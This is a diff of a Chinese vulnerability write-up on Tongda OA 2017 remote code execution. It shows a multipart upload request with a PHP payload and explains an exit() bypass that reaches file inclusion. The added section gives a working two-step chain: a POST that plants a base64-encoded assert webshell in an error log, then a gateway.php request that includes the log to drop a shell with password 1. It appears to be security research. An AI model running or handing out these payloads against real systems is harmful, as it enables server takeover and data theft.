@@ -31,7 +31,7 @@ Cookie: KEY_RANDOMDATA=3656; PHPSESSID=Y4er
 Connection: close
 
 ------WebKitFormBoundaryTfafXJtEseBHh3r1
-Content-Disposition: form-data; name="ATTACHMENT_1"; filename="1.png"
+Content-Disposition: form-data; name="ATTACHMENT"; filename="1.png"
 Content-Type: application/octet-stream
 
 <?php echo 'Y4er';
@@ -254,7 +254,7 @@ if ($json) {
 ```
 这里不传P参数就能绕过exit了，然后走到下面的include_once进行文件包含造成RCE。
 
-## 其他
+## 坑
 我的环境是通达oa2017，2020/03/18从官网下的。php.ini默认禁用了`disable_functions = exec,shell_exec,system,passthru,proc_open,show_source,phpinfo`，不知道其他版本是什么情况。参考使用com组件绕过disable_function
 
 通达OA之前报过变量覆盖的洞，所以你要知道直接传入的参数就会被覆盖掉变量里，这也是上面UPLOAD_MODE、P、DEST_UID可以直接传入的原因。
@@ -269,6 +269,19 @@ if ($json) {
 /ispirit/im/upload.php
 /mac/gateway.php
 ```
+
+2015没有文件包含，官方给的补丁2017的没有修复文件包含，所以还有很多种包含日志文件getshell的姿势，不一定要文件上传。
+```
+http://192.168.124.138/api/ddsuite/error.php
+POST:message=<?php file_put_contents("2.php",base64_decode("PD9waHAgYXNzZXJ0KCRfUE9TVFsxXSk7Pz4="));?>52011 
+```
+然后包含
+```
+http://192.168.124.138/mac/gateway.php
+POST:json={"url":"..\/..\/logs\/oa\/2003\/dd_error.log"}
+```
+在`http://192.168.124.138/mac/2.php`就是shell密码1
+
 ## 参考链接
 - http://www.tongda2000.com/news/673.php
 - http://club.tongda2000.com/forum.php?mod=viewthread&tid=128377
